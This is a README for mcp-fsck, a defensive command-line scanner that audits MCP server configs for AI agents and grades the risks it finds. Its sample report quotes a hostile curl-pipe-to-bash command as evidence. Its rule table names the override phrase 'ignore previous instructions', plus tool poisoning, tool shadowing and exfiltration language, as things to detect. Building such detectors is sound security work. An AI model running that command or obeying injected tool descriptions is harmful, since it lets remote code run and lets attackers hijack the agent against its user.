<div align="center">

# mcp-fsck

**Integrity check for MCP server configs.**
`fsck` for the MCP servers your AI agents run with — before they run with *you*.

[![CI](https://img.shields.io/badge/CI-GitHub_Actions-blue)](.github/workflows/ci.yml)
[![npm](https://img.shields.io/badge/npm-mcp--fsck-cb3837)](https://www.npmjs.com/package/mcp-fsck)
[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)

</div>

---

Your AI agent's MCP config is a list of programs that run automatically with your user's
permissions — reading files, executing commands, holding API keys. Nobody audits it.
`mcp-fsck` does:

```bash
npx mcp-fsck
```

It finds every MCP config on your machine (Claude Desktop, Claude Code, Cursor,
VS Code, Windsurf), parses each server definition, and reports what an attacker
or a malicious server could do with it — in a risk-graded, CI-friendly report.

## What it catches

**From static config analysis** (no servers executed):

| Rule | Severity | Detects |
|---|---|---|
| `MCP001` secrets-in-config | high | API keys, tokens, private key material in plaintext configs |
| `MCP002` shell-metachar-execution | critical | `sh -c`, pipes-to-shell, command substitution, runtime base64 decoding |
| `MCP003` inline-code-execution | medium | interpreters invoked with `-e`/`-c` instead of reviewed files |
| `MCP004` auto-install-unpinned-package | medium | `npx -y pkg` re-resolving code at every startup (the *MCP rug pull*) |
| `MCP005` unverified-publisher | info | packages not from a known official MCP publisher |
| `MCP006` insecure-transport | high | remote MCP servers over plain HTTP |
| `MCP007` remote-credentials-in-config | medium | bearer tokens / API keys in headers |
| `MCP008` broad-filesystem-scope | high | filesystem servers granted `/` or your whole home directory |
| `MCP009` world-writable-config | high | configs other local users can modify to re-tool your agent |
| `MCP010` config-drift | low | the same server name defined with different code across clients |

**With `--deep`** (opt-in; handshakes with each server via `initialize` + `tools/list` — never executes tools):

| Rule | Severity | Detects |
|---|---|---|
| `MCP011` tool-description-injection | critical | tool poisoning: "ignore previous instructions", secrecy directives, exfiltration language, hidden unicode |
| `MCP012` tool-shadowing | medium | descriptions that reference other servers' tools to hijack tool selection |
| `MCP013` dangerous-capability-combo | critical/high | one server holding exec + network, secrets + network, fs-read + network… |

Every server gets a letter grade; every finding gets evidence (secrets redacted) and a remediation.

```text
  mcp-fsck v0.1.0 — integrity check for MCP server configs
  scanned 1 config file · 4 servers · 9 findings (1 critical, 4 high, 4 medium)

  explicit /tmp/demo/config.json
    filesystem (npx)  grade D (score 35, 2 findings)
    HIGH [MCP008] broad-filesystem-scope
        Filesystem server granted root-level scope
        …
    sketchy-updater (sh)  grade F (score 75, 3 findings)
     CRITICAL  [MCP002] shell-metachar-execution
        Shell command built with metacharacters
        evidence: sh -c curl https://example.com/install.sh | bash
        → Run the underlying binary directly instead of routing through a shell …
```

## Install & use

```bash
npm install -g mcp-fsck     # or just: npx mcp-fsck
```

```bash
mcp-fsck                    # scan every discovered config (static rules)
mcp-fsck --deep             # also handshake with servers and audit their live tool metadata
mcp-fsck scan ./mcp.json    # scan specific config files
mcp-fsck list               # show discovered configs and the servers they define
mcp-fsck rules              # print the rule table
```

Key flags:

| Flag | Effect |
|---|---|
| `--deep` | enumerate tools from running servers (see safety notes) |
| `--json` | machine-readable output; credential-shaped values redacted |
| `--fail-on <sev>` | exit `1` when findings ≥ severity (default `high`; `none` to disable) |
| `--timeout <ms>` | per-server deep-mode timeout (default 10000) |

### CI usage

```yaml
- name: Audit MCP configs
  run: npx mcp-fsck --json --fail-on high
```

## Deep mode — what it does and doesn't do

`--deep` speaks just enough MCP to call `initialize` and `tools/list`. It **never invokes
any tool**, runs servers with a minimal environment (only `PATH`/`HOME`/locale plus the
env the config itself declares), and kills non-responders at the timeout.

It does, however, *start the server processes* — which for `npx`-style entries may download
packages. Only use `--deep` on configs you control, and treat it like you'd treat `npm install`:
a deliberate action, not a background default. Static mode is always safe.

## Why

MCP servers arrive from blog posts and package registries, get broad permissions by default,
and are stored in plaintext JSON files that sync to dotfile repos and backups. The attack
surface is real: tool poisoning, rug pulls, typosquatted servers, and configs that quietly
grant `/` to a filesystem server. `mcp-fsck` is the boring, offline check you run before
trusting any of it — and in CI so it stays trusted.

### How it compares

| | mcp-fsck | mcp-scan (Snyk) | mcp-audit (Rust) |
|---|---|---|---|
| Static config rules (secrets, injection, scoping) | ✅ | ✅ | ✅ |
| Live tool enumeration + poisoning analysis | ✅ | ✅ | — |
| Per-server grades + CI exit codes | ✅ | — | ✅ |
| Cross-client drift detection | ✅ | — | — |
| Runs fully offline (static mode) | ✅ | — | ✅ |

Different tools, different tradeoffs — run the one that fits. `mcp-fsck` aims to be the
fast, dependency-light local check with a report your whole team can act on.

## Threat model & limits

`mcp-fsck` is a linter, not a sandbox. It reads configs and (opt-in) tool metadata;
it cannot verify what compiled code actually does, and static heuristics can miss
clever obfuscation or flag odd-but-benign setups (that's why `MCP005` is `info`).
Findings are decision support — the judgment call stays with you.

## Development

```bash
npm install
npm run build        # tsup → dist/
npm test             # vitest — unit + live-handshake + CLI e2e tests
npm run typecheck
```

The test suite includes a fake MCP server (`test/fixtures/fake-mcp-server.mjs`) so the
deep-mode client and detection rules are tested against a real JSON-RPC handshake.

Contributions welcome: new rules, new client config formats, better heuristics.
Open an issue with a **redacted** config snippet before pasting anything sensitive.

## License

[MIT](LICENSE)
